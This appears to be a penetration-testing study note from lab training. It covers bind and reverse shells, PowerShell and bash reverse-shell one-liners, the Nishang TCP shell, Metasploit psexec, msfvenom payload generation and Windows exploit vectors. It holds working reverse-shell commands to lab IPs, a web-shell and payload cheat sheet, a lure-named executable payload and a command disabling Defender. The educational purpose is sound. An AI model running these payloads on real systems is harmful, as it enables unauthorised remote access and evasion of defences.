## Overview

> **Core Concept:** Shells bring us in; Payloads deliver the shells.

In penetration testing and offensive security, gaining a **shell** is often the primary objective post-enumeration. A shell grants interactive command-line access to a target operating system, allowing an attacker to execute system commands, assess local privilege escalation paths, transfer files, establish persistence, and pivot across the network.

## 1. Defining Shells

A **shell** is a text-based user-space interface that allows operators to interact directly with the operating system kernel (e.g., `Bash`, `Zsh`, `cmd.exe`, `PowerShell`).

![[Pasted image 20260812053603.png]]

### Why Target CLI Shells?

- **Low Visibility:** Command-Line Interfaces (CLI) leave a significantly smaller footprint on network bandwidth and are harder to detect compared to Graphical User Interfaces (GUI) like RDP or VNC.
- **Speed & Automation:** Scripting and terminal navigation are exponentially faster than GUI interaction.
- **Full OS Access:** Direct access to file systems, environment variables, and system binaries required for post-exploitation.

### Multi-Perspective Breakdown

|**Context**|**Definition & Functionality**|**Examples**|
|---|---|---|
|**Computing**|Standard user-space text interface for task management and system instruction.|`Bash`, `Zsh`, `cmd`, `PowerShell`|
|**Exploitation & Security**|An interactive command prompt obtained on a host by bypassing security controls or exploiting a system vulnerability.|Remote `cmd.exe` via EternalBlue (`MS17-010`)|
|**Web Infrastructure**|A malicious script uploaded to a web server (via File Upload vulnerabilities, LFI, etc.) that executes OS commands through web requests.|`PHP`, `ASPX`, `JSP` web shells triggered via HTTP/S|

## 2. Understanding Payloads

In cybersecurity and offensive operations, a **payload** refers to the specific piece of code designed to execute on a target machine to perform an action—most commonly, establishing a remote connection back to the attacker.

### Definition Across Domains

![[Pasted image 20260812053216.png]]

## 3. Operational Workflow

```
[ Enumeration ] ──> [ Identify Vulnerability ] ──> [ Craft/Select Payload ] ──> [ Execute & Catch Shell ]
```

1. **Enumeration:** Identify vulnerable services and potential entry points.
2. **Payload Selection:** Choose an appropriate payload based on the target OS, architecture, and network restrictions.
3. **Execution:** Deploy the payload via the exploit vector.
4. **Interactive Access:** Catch the incoming shell (Reverse Shell) or connect to the bound port (Bind Shell) to begin post-exploitation.

# Shell Anatomy & Command Interpreters

## Overview

Interacting with a target operating system requires a clear distinction between **Terminal Emulators** and **Command Language Interpreters**. While the terminal emulator serves as the visual GUI application, the interpreter processes text instructions and issues execution commands directly to the OS kernel.

```
+---------------------+        Input Commands        +--------------------------------+
|  Terminal Emulator  |  =========================>  |   Command Language Interpreter |
| (GUI Container)     |  <=========================  | (Bash, PowerShell, Zsh, etc.)  |
+---------------------+        Text Output           +--------------------------------+
```

## 1. Terminal Emulators

A **terminal emulator** is a software application that mimics a standalone hardware terminal, providing a graphical window to interact with the underlying system shell.

### Common Terminal Emulators by OS

|**Terminal Emulator**|**Supported Operating System(s)**|
|---|---|
|**Windows Terminal**|Windows|
|**cmder**|Windows|
|**PuTTY**|Windows|
|**kitty**|Windows, Linux, macOS|
|**Alacritty**|Windows, Linux, macOS|
|**xterm**|Linux|
|**GNOME Terminal**|Linux|
|**MATE Terminal**|Linux|
|**Konsole**|Linux|
|**Terminal**|macOS|
|**iTerm2**|macOS|

> **Note:** The choice of terminal emulator on an attacker machine is entirely a matter of workflow preference. On target systems, operators are limited to whatever native interfaces or terminal software are locally available.

## 2. Command Language Interpreters

A **command language interpreter** acts as a real-time translator, parsing user inputs, executing commands, and returning output.

$$\text{CLI Environment} = \text{Operating System} + \text{Terminal Emulator} + \text{Command Interpreter}$$

- **MITRE ATT&CK Mapping:** Classified under Execution techniques as **Command and Scripting Interpreter** ([T1059](https://attack.mitre.org/techniques/T1059/)).
- **Security Importance:** Identifying the active interpreter on a target host dictates the payload syntax, scripting flags, and execution primitives required during post-exploitation.

## 3. Identifying Active Shells (Linux )

Terminal emulators are decoupled from specific shell interpreters; a single terminal can host multiple interpreter instances (`Bash`, `PowerShell`, `Zsh`).

### Method 1: Identifying Prompt Symbols

- **`$` Prompt:** Indicates standard non-root user prompts in `Bash`, `Ksh`, and POSIX-compliant shells.
- **`#` Prompt:** Indicates root/privileged access in Unix-like environments.
- **`PS >` Prompt:** Indicates a `PowerShell` session.

### Method 2: Process Inspection (`ps`)

Checking running processes under the current terminal device (`TTY`):

```bash
enamto@htb[/htb]$ ps

    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```

### Method 3: Environment Variable Check (`env`)

Inspecting defined user variables for default shell binaries:

```bash
enamto@htb[/htb]$ env | grep SHELL

SHELL=/bin/bash
```

## 4. Cross-Platform Comparison: Bash vs. PowerShell

|**Feature**|**Bash**|**PowerShell**|
|---|---|---|
|**Primary OS Environment**|Linux / Unix|Windows (Cross-platform via PowerShell Core)|
|**Data Output Type**|Unstructured Text Streams|Structured .NET Objects|
|**Default Prompt**|`$` (User) / `#` (Root)|`PS C:\>`|
|**Primary Use Cases**|Linux administration, Bash scripting, core utility piping|Windows administration, Active Directory management, automation|

---

# Bind Shells Foundations

## Overview

A **Bind Shell** occurs when a listener is executed on the target (victim) machine, bound to a specific port, waiting for an incoming connection from the attacker's system. Once the attacker connects to that open port, access to the target's operating system interface (shell) is granted.

![[Pasted image 20260812060000.png]]

## 1. Operational Challenges & Security Drawbacks

Bind Shells face strict real-world defensive barriers because they rely on **inbound traffic** into the victim's network.

- **Requires Existing Listener:** A port-listening process must already be executing on the target.
- **Inbound Firewall Rules:** Network Firewalls and NAT/PAT at the perimeter heavily drop unsolicited inbound connections on non-standard ports.
- **Host-Based Firewalls (OS Level):** Windows Defender Firewall and Linux `iptables`/`ufw` typically block incoming port bindings.
- **Easier to Detect & Prevent:** Security appliances (IDS/IPS) and perimeter controls easily spot unexpected inbound listening sockets.

## 2. Fundamentals: Netcat (`nc`) as Client/Server

Netcat (the "Swiss Army Knife" of networking) operates across TCP/UDP and Unix sockets. Before spawning a shell, Netcat can establish a raw two-way TCP pipe between a client and a server.

### Step-by-Step Raw TCP Connection Demonstration

#### Server (Target Host)

Starts a listener on port `7777`:

```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```

- `-l` : Listen mode
- `-v` : Verbose output
- `-n` : Skip DNS resolution (numeric IPs only)
- `-p` : Local port number

#### Client (Attacker Box)

Connects directly to the Target IP on port `7777`:

```bash
enamto@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

> **Note:** Raw Netcat connections only pass text back and forth across the TCP pipe. To execute commands, a command interpreter (like `/bin/bash` or `cmd.exe`) must be explicitly redirected into the pipe.

## 3. Creating a Real Netcat Bind Shell

To turn a raw connection into an interactive system shell on Linux, named pipes (`fifos`) are used to redirect stdin, stdout, and stderr.

### Target Payload Execution (Server Side)

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

#### Payload Breakdown

1. `rm -f /tmp/f; mkfifo /tmp/f` — Removes any existing FIFO pipe named `/tmp/f` and creates a new named pipe.
2. `cat /tmp/f |` — Reads input from the named pipe and pipes it into Bash.
3. `/bin/bash -i 2>&1 |` — Executes an interactive Bash shell (`-i`) and redirects standard error (`2`) into standard output (`1`).
4. `nc -l 10.129.41.200 7777` — Starts Netcat listening on port `7777`.
5. `> /tmp/f` — Sends the output of Netcat back into the named pipe `/tmp/f`, completing the execution loop.

### Attacker Connection (Client Side)

```bash
enamto@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Target@server:~$ 
```

The attacker now has direct command-line access to the target host.

## 4. Bind Shell vs. Reverse Shell Quick Reference

|**Feature**|**Bind Shell**|**Reverse Shell**|
|---|---|---|
|**Listener Location**|Target / Victim Machine|Attacker Machine|
|**Connection Direction**|Inbound (Attacker $\rightarrow$ Target)|Outbound (Target $\rightarrow$ Attacker)|
|**Firewall Bypass**|Poor (Blocked by inbound rules)|Stronger (Egress traffic is often allowed)|
|**Use Case**|Internal network targets without strict inbound filtering|Targets behind NAT, routers, or strict perimeter firewalls|

---

# Reverse Shells Foundations & Windows Practice

## Overview

A [**Reverse Shell**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is an offensive connection mechanism where the attacker initiates a passive listener on their machine, and the target (victim) executes a payload that initiates an **outbound connection** back to the attacker.

![[Pasted image 20260812063436.png]]

## 1. Why Reverse Shells Over Bind Shells?

In real-world red teaming and penetration testing, reverse shells are far more successful than bind shells due to modern network architecture and defensive controls:

- **Egress Traffic Over Inbound Traffic:** Corporate firewalls and edge routers strictly block incoming connections (Inbound Filtering), but frequently permit outbound network traffic (Egress Traffic) on common web ports.
- **Bypassing NAT & Perimeter Security:** Targets behind Network Address Translation (NAT) or stateful perimeter firewalls can still initiate outbound sockets directly to an attacker's public IP address.
- **Strategic Port Binding:** Binding listeners to [common outbound ports ](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports)like `443` (HTTPS) or `80` (HTTP) minimizes suspicion, as these ports are rarely restricted for outbound employee traffic.

> **Defensive Edge:** Advanced Next-Generation Firewalls (NGFWs) equipped with **Deep Packet Inspection (DPI)** or Layer 7 monitoring can still detect unencrypted reverse shell traffic crossing port 443 by analyzing the packet payload structure rather than just the port number.

## 2. Living Off the Land (LotL) Concept

Relying on external binaries (such as transferring `nc.exe` to a Windows victim) increases detection risk and may fail if file transfer capabilities are limited.

**Living Off the Land (LotL)** involves utilizing built-in operating system binaries and native scripting interpreters (e.g., `PowerShell`, `cmd.exe`, `Bash`, `python`) to deliver payloads and establish remote sessions without dropping external tools to disk.

## 3. Practical Exercise: Windows PowerShell Reverse Shell

### Step 1: Set Up the Attacker Listener (Server)

Bind Netcat to a privileged, highly trusted egress port (`443`):

```bash
enamto@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

### Step 2: Native PowerShell One-Liner Payload

Execute the following one-liner on the target Windows system via Command Prompt or an exploitation vector:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Payload Parameter Breakdown

|**Parameter / Code**|**Function**|
|---|---|
|`powershell -nop -c`|Launches PowerShell without loading user profiles (`-nop`) and executes the command string (`-c`).|
|`New-Object System.Net.Sockets.TCPClient`|Instantiates a raw TCP client socket connecting back to the specified IP and port.|
|`iex $data`|`Invoke-Expression`: Evaluates and executes received command strings dynamically in memory.|
|`2>&1|Out-String`|

## 4. Antivirus & AMSI Considerations

Executing raw un-obfuscated PowerShell reverse shell payloads on modern Windows hosts will trigger **Antimalware Scan Interface (AMSI)** or **Windows Defender Antivirus**.

### Observed Defensive Catch

```powershell
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

### Lab Override (Disabling Real-Time Protection)

In controlled lab environments, real-time monitoring can be toggled off via an administrative PowerShell prompt:

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

---

# Introduction to Payloads & One-Liner Dissection

## Overview

In general computing, a **payload** represents the intended transmitted message or functional data. In offensive security, a **payload** refers to the specific code or command set delivered to a target system to exploit a vulnerability, execute malicious actions, or establish interactive access (such as a reverse or bind shell).

To bypass security controls and anticipate AV/EDR flags, penetration testers must deconstruct and understand how payload syntax operates under the hood.

## 1. Dissecting the Linux Netcat/Bash Reverse Shell

A standard POSIX-compliant one-liner used to bind an interactive Bash shell to a remote TCP listener using a named pipe (`FIFO`):

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

```
+-----------------------------------------------------------------------------------+
|                                Linux Target Host                                  |
|                                                                                   |
|  /tmp/f (FIFO)  ──>  cat  ──>  /bin/bash -i (2>&1)  ──>  nc  ──> [ /tmp/f Pipe ]  |
+---------------------------------------------------------|-------------------------+
                                                          | Network Socket (TCP)
                                                          v
                                               Attacker Listener (7777)
```

### Technical Breakdown

|**Command Component**|**Function & Mechanism**|
|---|---|
|`rm -f /tmp/f;`|Forces removal (`-f`) of any existing pipe file at `/tmp/f` to prevent execution collisions. The semicolon `;` sequences the next command.|
|`mkfifo /tmp/f;`|Creates a First-In, First-Out (**FIFO**) named pipe file at `/tmp/f` to manage input/output streams.|
|`cat /tmp/f \|`|Reads data written into `/tmp/f` and pipes (`\|`) standard output to the input of the next command.|
|`/bin/bash -i 2>&1 \|`|Launches an interactive Bash shell (`-i`). Redirects standard error (`2`) into standard output (`1`) so both streams travel through the pipe (`\|`).|
|`nc 10.10.14.12 7777 > /tmp/f`|Initiates a Netcat TCP connection to `10.10.14.12:7777`. Redirects (`>`) output received from the attacker back into `/tmp/f`, closing the execution loop.|

## 2. Dissecting the Windows PowerShell Reverse Shell

A native Windows command line payload that instantiates .NET framework classes directly from memory to establish a raw socket connection back to an attacker.

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Technical Breakdown

```
[ CMD / Remote Exec ]
        │
        ▼
[ powershell.exe -nop -c ]
        │
        ├─► System.Net.Sockets.TCPClient  ──> Connects to Attacker IP:Port
        │
        ├─► System.Text.ASCIIEncoding     ──> Encodes bytes <─► ASCII strings
        │
        ├─► Invoke-Expression (iex)      ──> Executes received commands in memory
        │
        └─► Stream Write & Flush         ──> Sends output & prompt (PS C:\> ) back
```

|**Parameter / Snippet**|**Detailed Technical Function**|
|---|---|
|`powershell -nop -c`|Spawns `powershell.exe` ignoring local user profiles (`-nop`) and executing the string payload (`-c`).|
|`$client = New-Object System.Net.Sockets.TCPClient(...)`|Creates a .NET `TCPClient` object that connects directly to the attacker socket (`10.10.14.158:443`).|
|`$stream = $client.GetStream();`|Obtains the network stream interface from the active TCP socket for I/O operations.|
|`[byte[]]$bytes = 0..65535\|%{0};`|Allocates an empty 64KB byte buffer array filled with zeroes.|
|`while(($i = $stream.Read(...)) -ne 0)`|Establishes a continuously listening loop reading incoming bytes from the TCP socket until closed.|
|`$data = (...).GetString($bytes, 0, $i);`|Converts incoming byte streams from the network into ASCII string commands.|
|`$sendback = (iex $data 2>&1 \| Out-String);`|**Critical Component:** Passes raw commands stored in `$data` to `Invoke-Expression` (`iex`) for in-memory execution, capturing `stdout` and `stderr` (`2>&1`).|
|`$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`|Appends the standard PowerShell prompt string showing the target's current working directory.|
|`$stream.Write(...); $stream.Flush()`|Converts output text back to bytes, transmits it over the wire, and clears the network stream buffer.|
|`$client.Close()`|Gracefully terminates the socket connection when the loop exits.|

## 3. Script-Based Implementation: Nishang (`Invoke-PowerShellTcp`)

Payloads can also be packaged into modular, full-featured PowerShell function scripts (`.ps1`). The **Nishang** framework's `Invoke-PowerShellTcp.ps1` encapsulates both Reverse and Bind shell logic.

### Key Functional Extract


```powershell
function Invoke-PowerShellTcp 
{
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [String]$IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Int]$Port,

        [Switch]$Reverse,
        [Switch]$Bind
    )

    try {
        if ($Reverse) {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }
        if ($Bind) {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        # Send banner & interactive prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            try {
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            } catch {
                Write-Error $_
            }
            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
    } catch {
        Write-Error $_
    }
}
```

---

# Metasploit & Payload Automation

## Overview

The **Metasploit Framework (MSF)**, maintained by Rapid7, automates vulnerability exploitation, payload creation, and session management. In offensive operations, MSF simplifies delivering staged and non-staged payloads (such as **Meterpreter**) across diverse attack vectors.

Understanding what occurs behind the automated framework interface—from target enumeration to memory-injection stages—is critical to preventing unintended system crashes and bypassing modern Endpoint Detection and Response (EDR) solutions.

## 1. Targeted Enumeration: Nmap to MSF Mapping

Automated exploitation begins with precise service enumeration. For instance, discovering open SMB ports (`445/tcp`) on a Windows target guides module selection within MSF.

```bash
enamto@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds
```

### Searching Modules in `msfconsole`

```bash
msf6 > search smb
```

|**Module Name**|**Type**|**Target Platform**|**Service Vector**|**Utility**|
|---|---|---|---|---|
|`exploit/windows/smb/psexec`|Exploit|Windows|SMB (Port 445)|Authenticated Code Execution via Service Manager|

#### Deconstructing Module Naming Conventions

$$\text{Module Path} = \text{[Type]} / \text{[Platform]} / \text{[Service/Protocol]} / \text{[Specific Vector]}$$

## 2. Exploit Configuration & Execution Workflow

Using `exploit/windows/smb/psexec` demonstrates an authenticated SMB attack that drops an arbitrary service binary to execute a payload on the target host.

```
+------------------+     1. Authenticate (SMB)     +--------------------+
|   Attacker Box   | ----------------------------> |    Target Host     |
|   (MSF Handler)  |                               |   (Port 445 SMB)   |
|                  |     2. Create & Start Service |                    |
|  LHOST: LPORT    | ----------------------------> | ADMIN$ Share       |
|                  |                               |                    |
|                  |     3. Staged Connection      |                    |
|  Meterpreter <---| <============================ | In-Memory DLL Exec |
+------------------+                               +--------------------+
```

### Step-by-Step Module Configuration

```bash
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass password
msf6 exploit(windows/smb/psexec) > set SMBUser username
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
msf6 exploit(windows/smb/psexec) > exploit
```

### Execution Log & Stage Delivery

```bash
[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

## 3. Deep Dive: Meterpreter Shell vs. Native CLI

**Meterpreter** is an advanced, multi-faceted payload that resides strictly in target memory via Reflective DLL Injection, offering dynamic extension loading without writing artifacts to disk.

```bash
# Drop from Meterpreter session into system native command shell
meterpreter > shell
Process 604 created.
Channel 1 created.

C:\WINDOWS\system32>
```

### Capabilities Matrix

|**Feature / Metric**|**Standard Reverse CLI (cmd / bash)**|**Meterpreter Payload (meterpreter)**|
|---|---|---|
|**Execution Architecture**|Spawns standard OS terminal process.|In-memory DLL Injection (No disk artifacts).|
|**Features & Modules**|Limited to native OS commands.|Keylogging, mimikatz integration, pivoting, hash dumping.|
|**Stealth Level**|Highly visible process creation logs.|Stealthier (resides within injected process memory space).|
|**Network Resilience**|Single channel; dies if connection drops.|Encrypted TLS channel with auto-reconnect capabilities.|

---

# Payload Crafting with MSFvenom

## Overview

`msfvenom` is the dedicated, standalone payload generation and encoding utility within the Metasploit Framework. It combines the functionality of `msfpayload` and `msfencode` into a single tool, allowing operators to generate raw shellcode, executable binaries (`.exe`, `.elf`), web shells (`.php`, `.aspx`), and injected DLLs without launching the full `msfconsole` environment.

```
                  +-----------------------------------+
                  |             MSFvenom              |
                  +-----------------------------------+
                                    │
           ┌────────────────────────┴────────────────────────┐
           ▼                                                 ▼
+---------------------+                           +---------------------+
|   Staged Payloads   |                           |  Stageless Payloads |
| (Small initial stage|                           | (Self-contained,    |
| fetches main shell) |                           | single execution)   |
+---------------------+                           +---------------------+
```

## 1. Staged vs. Stageless Payloads

Understanding payload delivery dynamics is essential when selecting the appropriate payload for a given network environment, bandwidth constraint, or evasion requirement.

```
Staged Delivery:
[ Attacker ] ──( 1. Small Stager )──> [ Target ] ──( 2. Fetches Stage 2 )──> [ Complete Shell ]

Stageless Delivery:
[ Attacker ] ───────────────( Complete Single-Binary Payload )───────────────> [ Target Execution ]
```

### Technical Comparison

|**Dimension**|**Staged Payloads**|**Stageless Payloads**|
|---|---|---|
|**Execution Architecture**|A tiny initial bootstrap code (Stage 1 / Stager) executes, allocates memory, connects back to the handler, and fetches the larger payload (Stage 2).|The entire payload binary contains all required shellcode and networking logic in a single self-contained package.|
|**Metasploit Naming Scheme**|Separated by forward slashes (`/`):<br><br>  <br><br>`windows/meterpreter/reverse_tcp`<br><br>  <br><br>`linux/x86/shell/reverse_tcp`|Separated by underscores (`_`):<br><br>  <br><br>`windows/meterpreter_reverse_tcp`<br><br>  <br><br>`linux/zarch/meterpreter_reverse_tcp`|
|**Size & Memory Footprint**|Extremely small initial footprint; ideal when memory exploitation limits buffer space.|Larger binary size on disk/network.|
|**Network Stability**|Vulnerable to high network latency or firewall drops mid-stage transfer.|Highly reliable over unstable networks; no second stage to fetch.|
|**Evasion Characteristics**|Requires two separate network transmissions (Stage 1 exec + Stage 2 download).|Single network transmission; often preferred for social engineering attachments.|

## 2. Command Anatomy & Flags

Creating standalone binaries with `msfvenom` uses standardized options:

$$\text{msfvenom} -p \text{ [Payload]} \quad \text{LHOST=}[IP] \quad \text{LPORT=}[Port] \quad -f \text{ [Format]} \quad > \text{ [Output File]}$$

### Essential MSFvenom Flags

|**Flag**|**Name**|**Function**|
|---|---|---|
|`-p`, `--payload`|Payload Selection|Specifies the target payload path (e.g., `linux/x64/shell_reverse_tcp`).|
|`-f`, `--format`|Output Format|Specifies the compilation output (e.g., `elf`, `exe`, `raw`, `asp`, `php`, `c`, `python`).|
|`LHOST`|Local Host|Defines the IP address where the incoming reverse shell connection will land.|
|`LPORT`|Local Port|Defines the listening port on the attacker handler.|
|`-a`, `--arch`|Architecture|Specifies the architecture (`x86`, `x64`, `armle`, `mips`).|
|`--platform`|Platform|Defines the target operating system (`windows`, `linux`, `osx`, `android`).|
|`-e`, `--encoder`|Encoder|Selects an encoding module to remove bad characters or obfuscate basic signatures (e.g., `x86/shikata_ga_nai`).|
|`-b`, `--bad-chars`|Bad Characters|Specifies characters to avoid during generation (e.g., `\x00\x0a\x0d`).|

## 3. Practical Binary Generation Examples

### Linux 64-Bit ELF Binary (`.elf`)

Generates a stageless Linux executable that initiates an outbound TCP socket back to `10.10.14.113:443`:

```bash
enamto@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

![[Pasted image 20260812134250.png]]

#### Catching the Linux Session

```bash
enamto@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
```

### Windows Executable (`.exe`)

Generates a stageless 32-bit Windows PE executable:

```bash
enamto@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

![[Pasted image 20260812134331.png]]

#### Catching the Windows Session

```bash
enamto@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]

C:\Users\htb-student\Downloads>
```

## 4. Multi-Platform MSFvenom Cheat Sheet

```
+----------------------------------------------------------------------------------------------------------+
| Platform          | Format   | Command Syntax                                                            |
+-------------------+----------+---------------------------------------------------------------------------+
| Windows x64 Exec  | exe      | msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe  |
| Linux x64 ELF     | elf      | msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf    |
| PHP Web Shell     | raw      | msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php    |
| ASPX Web Shell    | aspx     | msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx     |
| Python Script     | raw      | msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw        |
| C Shellcode Array | c        | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f c |
+----------------------------------------------------------------------------------------------------------+
```

---

# Windows Exploitation, Reconnaissance, & Payload Vectors

## Overview

Windows enterprise infrastructure—especially environments leveraging Active Directory, SMB shares, and hybrid cloud synchronization—presents a wide and complex attack surface. Gaining access requires identifying operating system indicators, understanding historical and current exploit primitives, selecting the proper payload binary format (`.exe`, `.dll`, `.msi`, `.bat`), and leveraging native Windows management interfaces like `cmd.exe` and `PowerShell`.

![[Pasted image 20260812150352.png]]
## 1. Notable Windows Exploits Matrix

```
[ Enumeration / Fingerprinting ] ──> [ Vulnerability Identification ] ──> [ Exploit Execution ] ──> [ SYSTEM Shell Session ]
```

|**Vulnerability / Exploit**|**Identifier / Bulletin**|**Affected Component / Vector**|**Impact & Mechanics**|
|---|---|---|---|
|**MS08-067**|KB958644|SMB Service (`Server` service)|Critical remote code execution via stack buffer overflow in NetAPI32.dll (used by Conficker & Stuxnet).|
|**EternalBlue**|MS17-010 / CVE-2017-0144|SMBv1 Protocol|Kernel pool corruption allowing unauthenticated remote code execution with `NT AUTHORITY\SYSTEM` privileges.|
|**PrintNightmare**|CVE-2021-34527|Windows Print Spooler (`spoolsv.exe`)|RCE and Local Privilege Escalation (LPE) via malicious driver installation through `RpcAddPrinterDriverEx()`.|
|**BlueKeep**|CVE-2019-0708|Remote Desktop Protocol (RDP)|Pre-authentication RCE exploiting heap corruption in RDP internal channel handling.|
|**SigRed**|CVE-2020-1350|Windows Domain Name System (DNS)|Heap-based buffer overflow in `dns.exe` processing SIG resource records (leads to Domain Admin LPE).|
|**SeriousSam (HiveNightmare)**|CVE-2021-36934|Volume Shadow Copies / Registry ACLs|Insecure file permissions on SAM/SYSTEM registry hives allow non-privileged users to read administrative password hashes.|
|**ZeroLogon**|CVE-2020-1472|Netlogon Remote Protocol (MS-NRPC)|Cryptographic weakness in AES-CFB8 initialization allows an attacker to reset Domain Controller computer account passwords to null.|

## 2. Reconnaissance & Host Fingerprinting

Identifying a target host as a Windows machine prior to exploitation prevents sending improper payloads and reduces noise.

### TTL (Time To Live) Fingerprinting

Default ICMP reply TTL values indicate the target's operating system family:

- **Windows Default TTL:** `128` (or slightly lower if hops are traversed, e.g., 127/126)
- **Linux/Unix Default TTL:** `64`
- **Network Devices (Cisco/Solaris):** `255`

```bash
enamto@htb[/htb]$ ping 192.168.86.39

64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
```

### Nmap OS Detection & Banner Grabbing

```bash
# OS Fingerprinting scan
enamto@htb[/htb]$ sudo nmap -v -O 192.168.86.39

# Banner grabbing scan using NSE
enamto@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse
```

```bash
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393
```

## 3. Windows Payload Formats & Execution Drivers

Selecting the correct execution binary or script depends on the drop vector and privileges available on the victim.

|**Format**|**File Extension**|**Execution Mechanism**|**Primary Offensive Use Case**|
|---|---|---|---|
|**Dynamic-Link Library**|`.dll`|Loaded by `rundll32.exe`, process injection, or DLL Search Order Hijacking.|Escalating to `SYSTEM` or hijacking legitimate binary execution paths.|
|**Batch Script**|`.bat` / `.cmd`|Executed sequentially by `cmd.exe`.|Automated reconnaissance, adding local users, or spawning persistent backdoors.|
